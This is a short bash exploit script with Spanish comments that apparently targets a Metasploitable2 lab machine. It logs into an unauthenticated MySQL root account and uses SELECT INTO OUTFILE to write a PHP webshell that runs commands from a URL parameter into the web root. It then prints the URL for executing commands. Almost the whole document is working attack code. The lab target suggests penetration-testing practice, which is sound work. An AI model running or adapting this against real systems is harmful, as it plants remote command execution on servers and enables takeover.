#!/bin/bash
# Exploit: Escritura de webshell vía MySQL sin autenticación
# Objetivo: Metasploitable2 con MySQL expuesto
# Autor: Javier

HOST="192.168.56.102"
USER="root"
WEB_PATH="/var/www/html/shell.php"
PAYLOAD='<?php system($_GET["cmd"]); ?>'

echo "[+] Conectando a MySQL como root sin contraseña..."
mysql -h "$HOST" -u "$USER" -e "SELECT '$PAYLOAD' INTO OUTFILE '$WEB_PATH';" 2>error.log

if grep -q "already exists" error.log; then
    echo "[!] El archivo ya existe. Posiblemente la shell ya está activa."
    echo "[>] Intenta acceder: http://$HOST/shell.php?cmd=id"
elif grep -q "denied" error.log || grep -q "can't create" error.log; then
    echo "[!] Error de permisos al escribir la shell."
    cat error.log
else
    echo "[+] Webshell escrita en $WEB_PATH"
    echo "[+] Accede desde: http://$HOST/shell.php?cmd=id"
fi

rm -f error.log
